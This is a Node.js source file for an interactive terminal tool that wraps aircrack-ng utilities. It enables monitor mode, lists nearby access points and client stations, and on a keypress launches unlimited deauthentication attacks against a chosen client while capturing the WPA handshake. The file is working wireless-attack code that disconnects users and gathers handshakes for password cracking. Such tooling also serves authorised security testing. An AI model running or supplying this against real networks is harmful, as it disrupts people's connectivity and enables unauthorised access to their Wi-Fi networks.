'use strict';

const EventEmitter = require('events').EventEmitter;
const logUpdate = require('log-update');
const Table = require('cli-table2');
const keypress = require('keypress');
const os = require('os');
const colors = require('colors');

const airodump = require('./libs/airodump-ng');
const aireplay = require('./libs/aireplay-ng');
const airmon = require('./libs/airmon-ng');

const MONITOR = 'monitor';
const ATTACK = 'attack';

const RENDER_RATE = 500;

const tableOptions = {
  chars: {
    'top': '', 'top-mid': '', 'top-left': '', 'top-right': '', 'bottom': '', 'bottom-mid': '', 'bottom-left': '',
    'bottom-right': '', 'left': '', 'left-mid': '', 'mid': '', 'mid-mid': '', 'right': '', 'right-mid': '', 'middle': ' '
  },
  style: { 'padding-left': 0, 'padding-right': 0 }
};

keypress(process.stdin);

class AirCrackApp extends EventEmitter {

  constructor() {
    super();

    this.status = null; // App status - Monitor Or Attack
    this.handshake = false;
    this.stationIndex = 0;
    this.stations = [];
    this.renderTimerID = null;
    this.viewData = [];
    this.viewInfo = [];
    this.iface = null;

    const self = this;

    /**
     * Methods to fireup keypress actions
     */
    this.controls = {
      'return': () => self.status === MONITOR && self.emit('attack'),  // Attack BSSID <---> STATION
      up: () => self.emit('choose', 'up'), // Choose BSSID <---> STATION
      down: () => self.emit('choose', 'down'), // Choose BSSID <---> STATION
      backspace: () => self.status === ATTACK && self.emit('monitor'), // Go back, if attack mode
      r: () => self.status === MONITOR && self.emit('reset'),
      escape: () => self.emit('quit'), // Quit application
      q: () => self.emit('quit'), // Quit application
    };
  }

  init(iface = null) {
    if (this.status) {
      return;
    }

    this.iface = iface;

    this.renderTimerID = setInterval(() => this.render(this.viewData, this.viewInfo), RENDER_RATE);

    process.stdin.setRawMode && process.stdin.setRawMode(true);
    process.stdin.resume();
    process.stdin.on('keypress', (chunk, key) => key && this.controls[key.name] && this.controls[key.name]());

    this.emit(MONITOR);
  }

  /**
   * Render to cli
   * @param data
   * @param info
   */
  render(data, info = []) {

    if (!Array.isArray(data)) {
      return;
    }

    const lines = ['', '\u001b\[J'];
    const table = new Table(tableOptions);

    data.forEach((line) => table.push(line));

    lines.push(table.toString());

    logUpdate([...lines,
      '',
      ...info,
      '\u001b\[1\;1H',
    ].join(os.EOL));
  }

  /**
   * Set data that will be rendered
   * @param data
   * @param info
   */
  setRender(data, info = []) {
    this.viewData = data;
    this.viewInfo = info.length > 0 ? info : this.viewInfo;
  }

  setError(error) {

    clearInterval(this.renderTimerID);

    console.error(error);
    process.exit(1);

  }

  /**
   * Set available stations from airodump parsed data
   * @param data
   */
  accumulateStations(data) {

    Object.keys(data.items).sort().forEach((STATION) => {

      const newItem = Object.assign({STATION}, data.items[STATION]);

      let index = -1;
      this.stations.forEach((item , i) => item.STATION === newItem.STATION && (index = i));

      // Update
      if (~index) {
        this.stations[index] = newItem;
      // Add new
      } else {
        this.stations.push(newItem);
      }

    });

    let lastIndex = this.stations.length - 1;
    lastIndex = lastIndex < 0 ? 0: lastIndex;
    if (this.stationIndex > lastIndex) {
      this.stationIndex = 0;
    }

  }

  /**
   * Clean up stations prop
   */
  resetStations() {
    this.stations = [];
  }

  /**
   * Get current station object
   * @returns {*}
   */
  getStation() {
    return this.stations[this.stationIndex] || {};
  }

  /**
   * Prepare Data to render in cli
   * @returns {*}
   */
  prepareMonitorRender() {

    const currIndex = this.stationIndex;

    // Prepare for rendering
    const fields = ['#', ...Object.keys(this.stations[0])];

    const lines = this.stations.map((station, index) => [
      (index + 1).toString(), ...Object.values(station)
    ].map((item, i) => index === currIndex && i < 3 ? item.bgRed.white : item));

    return [
      fields,
      ...lines,
      [],
      ['', `current #: ${currIndex + 1}`]
    ];
  }

  /**
   * Increment station index
   */
  incStationIndex() {
    if (this.stationIndex < this.stations.length - 1) {
      this.stationIndex++;
    } else {
      this.stationIndex = 0;
    }
  }

  /**
   * Decrement station index
   */
  decStationIndex() {
    if (this.stationIndex) {
      this.stationIndex--;
    } else {
      this.stationIndex =  this.stations.length ? this.stations.length - 1 : 0;
    }
  }

}

const self = new AirCrackApp();

self.on(MONITOR, () => {

  let prom;

  aireplay.stop();

  self.setRender([],
    [
      `\t${String.fromCharCode(8593)}${String.fromCharCode(8595)} = choose\tEnter = attack\tr = reset\tEsc = quit`
    ]
  );

  if (self.status) {

    prom = Promise.resolve(self.iface);

  } else {

    self.setRender([{'Starting:': `airmon-ng`}]);

    // First run - run airmon-ng
    prom = airmon.run()
      .then((data) => {

        const ifaces = data.join('|').split('|');

        if (!self.iface) {
          self.iface = ifaces.shift(); // use first interface by default
        } else if (!~ifaces.indexOf(self.iface)) {
          return Promise.reject(new Error(`Invalid interface provided: ${self.iface}`));
        }

        return self.iface;
      })
      // Run airmon-ng start interface
      .then((iface) => {

        self.setRender([{'Starting:': `airmon-ng start ${iface}`}]);

        return airmon.start(iface);
      })
      // Run airmon-ng
      .then((result) => {

        self.setRender([{'Starting:': `airmon-ng`}]);

        return airmon.run();
      })
      // set interface
      .then(data => {
        const iface = data.join('|').split('|').filter(iface => ~iface.indexOf('mon')).pop();

        if (!iface) {
          return Promise.reject(new Error(`Trying to use unknown interface ${self.iface}`));
        }

        self.iface = iface;

        return self.iface;
      });
  }

  // Run airodump-ng interface
  prom.then(iface => {

      self.setRender([{'Starting:': `airodump-ng ${iface}`}]);

      return airodump.run(iface);
    }).then((airodump) => {
      self.setRender([{'Status:': 'Waiting for attackable STATION <---> BSSID pair.'}]);
    })
    .catch((error) => self.setError(error));

  self.status = MONITOR;

});

self.on(ATTACK, () => {

  const {
    BSSID,
    ESSID,
    CH,
    STATION
    } = self.getStation();

  if (!BSSID) {
    return;
  }

  self.status = ATTACK;
  self.handshake = false;

  self.setRender([{
      'Starting:': `airodump-ng --bssid ${BSSID} -w ${ESSID} -c ${CH} ${airodump.iface}`
    }],
    [
      `\tBackspace = go back\tEsc = quit`,
    ]
  );
  // Run airodump-ng --bssid ? -w ? -c ?
  airodump.run(null,
    '--bssid', BSSID,
    '-w', ESSID,
    '-c', CH
  )
  // Run aireplay-ng --deauth 0 -a ? -c ? interface
  .then((airodump) => {

    self.setRender([{
      'Starting:': `aireplay-ng --deauth 0 -a ${BSSID} -c ${STATION} ${airodump.iface}`
    }]);

    return aireplay.run(airodump.iface,
      '--deauth', '0',
      '-a', BSSID,
      '-c', STATION
    );
  })
  .catch((error) => self.setError(error));

});

self.on('choose', (dir) => {
  if (dir === 'up') {
    self.decStationIndex();
  } else if(dir === 'down') {
    self.incStationIndex();
  }
});

self.on('reset', self.resetStations);

self.on('quit', () => {

  process.stdin.pause();

  airmon.stop(self.iface).then((result) => {
    process.exit();
  }).catch((error) => {

    clearInterval(self.renderTimerID);

    console.error(error);

    process.exit(1);
  });

});

airodump.on('data', (data) => {

  if (self.status === ATTACK) {
    if (data.handshake) {
      self.handshake = true;
    }
    return;
  }

  self.accumulateStations(data);

  if (!self.stations.length) {
    return;
  }

  self.setRender(self.prepareMonitorRender());
});

aireplay.on('data', (data) => {

  if (self.status === MONITOR) {
    return;
  }

  const { ESSID, BSSID, STATION, CH } = self.getStation();

  self.setRender([
    {'HANDSHAKE': (self.handshake ? '+' : '-')},
    {'ESSID:': ESSID},
    {'BSSID:': BSSID},
    {'STATION:': STATION},
    {'CHANNEL:': CH},
    {'STATUS:': data.STATUS},
    {'ACKs:': data.ACKs}
  ]);
});

module.exports = self;
